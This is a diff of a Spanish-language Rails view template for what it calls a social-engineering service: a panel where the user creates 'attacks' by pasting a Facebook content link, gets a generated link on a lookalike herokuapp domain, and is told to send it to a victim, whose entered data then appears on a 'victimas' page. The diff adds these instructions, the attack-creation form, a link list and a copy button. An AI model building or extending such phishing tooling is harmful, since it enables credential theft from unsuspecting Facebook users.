@@ -1,23 +1,11 @@
+<script type="text/javascript">
+	function copia_portapapeles( id){ 
+		text=$("#link"+id).html();
+	   window.prompt("Copia este texto:", text);
+	}
+</script>
 <div class="container">
-	<%= form_for @ff,:html => {:class => "form-horizontal"} do |f|%>
-	  <fieldset>
-		  <legend>Crear nuevo ataque</legend>
-		  <div class="form-group">
-	       		<%= f.label "Link de condenido de facebook",class:"col-lg-2 control-label"%>
-	      <div class="col-lg-4">
-	       		<%= f.text_field :link , class:"form-control"%>
-	      </div>
-	    </div>
-	  <%= f.text_field :idusuario, value: current_user.id , type:"hidden"%><br />
-	  <div class="form-group">
-      <div class="col-lg-10 col-lg-offset-2">
-        <%= f.submit "Crear ataque", class:"btn btn-primary" %>
-      </div>
-    </div>
-	 
-	  </fieldset>
 
-	<% end %>
 	<div  class="row">
   	<div class="col-md-12 text-center">
   		<h1>Ataques</h1>
@@ -27,7 +15,7 @@
   	<br>
  	<div  class="row">
  		<div class="col-md-12">
-	  		 <h2>instrucciones:</h2>
+	  		 <h2>Instrucciones:</h2>
 	  	</div>
 	  </div>
 	  <div  class="row">
@@ -36,30 +24,56 @@
 		  		 <h2>¿Como Funciona?</h2>
 		  		 <br>
 		  		 <p>
-		  		 	sdsadsadsads  hb hbh bh bhj  bbhjbh jbh jb bhjbh bjh bhj bhj b hjbh bh bhj bhj bhj bjh bjh bhbhj bh bj hbh bj bjh bjhb hb hb hjb hjb hjb hjb jhb hjb hjb h hj hj hjj hb hjb jhb hjb hjb adsad s dsa
+		  		 	Esta plataforma es un servicio de ingeniería social por lo tanto es necesario generar una trampa para que sea el mismo usuario el que te proporcione los datos para la creación de esta trampa se deben seguir los siguientes pasos.
 		  		 </p>
 		  	</div>
 	  	</div>
 	  	<div class="col-md-6">
 			<div class="col-md-12 jumbotron">
-				 <h2>¿Pasos?</h2>
+				 <h2>Pasos</h2>
 				 <ul class="list-group">
 				  <li class="list-group-item">
 				    <span class="badge">1</span>
-				    Cras justo odio
+				    Copiar el un link de algun contenido de facebook el cual servira para redireccionar la pagina.
 				  </li>
 				  <li class="list-group-item">
 				    <span class="badge">2</span>
-				    Dapibus ac facilisis in
+				    pegar el link de escontenido en campo de texto que se encuentra abajo.
 				  </li>
 				  <li class="list-group-item">
 				    <span class="badge">3</span>
-				    Morbi leo risus
+				    Precionar el boton de crear ataque
+				  </li>
+				  <li class="list-group-item">
+				    <span class="badge">3</span>
+				    Copiar el link y enviarselo a la victima si esta ingresa sus datos podras verlos <%=link_to "aquí", "/welcome/victimas"%>
 				  </li>
 				</ul>
 		  	</div>
 	  	</div>
  	</div>
+ 		<%= form_for @ff,:html => {:class => "form-horizontal"} do |f|%>
+	  <fieldset>
+		  <legend>Crear nuevo ataque</legend>
+		  <div class="form-group">
+	       		<%= f.label "Link de redirecion",class:"col-lg-2 control-label"%>
+	      <div class="col-lg-4">
+	       		<%= f.text_field :link , class:"form-control"%>
+	      </div>
+	    </div>
+	  <%= f.text_field :idusuario, value: current_user.id , type:"hidden"%>
+	  <div class="form-group">
+      <div class="col-lg-10 col-lg-offset-2">
+      	<div class="radio">
+  			<label><input type="radio" name="facebook"checked="checked" >Facebook</label>
+		</div>
+        <%= f.submit "Crear ataque", class:"btn btn-primary" %>
+      </div>
+    </div>
+	 
+	  </fieldset>
+
+	<% end %>
  	<div class="row">
  		<div class="col-md-12">
  			<h3>lista de ataques:</h3>
@@ -81,10 +95,10 @@
 	  	<%cont = cont+1;%>
 	    <tr>
 	      <td><%=cont%></<td>
-	      <td><%="https://facebook--content.herokuapp.com/?usuario=#{f.idusuario}&link=#{f.id}"%></td>
+	      <td id="link<%=cont%>"><%="https://facebook--content.herokuapp.com/?usuario=#{f.idusuario}&link=#{f.id}"%></td>
 	      <td><%=link_to "ir","#{f.link}"%></td>
 	      <td><%=link_to "Eliminar", f,method: :delete%></td>
-	      <td>Column content</td>
+	      <td><input type="button" value="Copiar" onclick="copia_portapapeles(<%=cont%>)"> </td>
 	    </tr>
 	    <%end%>
 	  </tbody>
@@ -111,8 +125,6 @@
           <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
         </div>
       </div>
-      
     </div>
   </div>
-  
 </div>
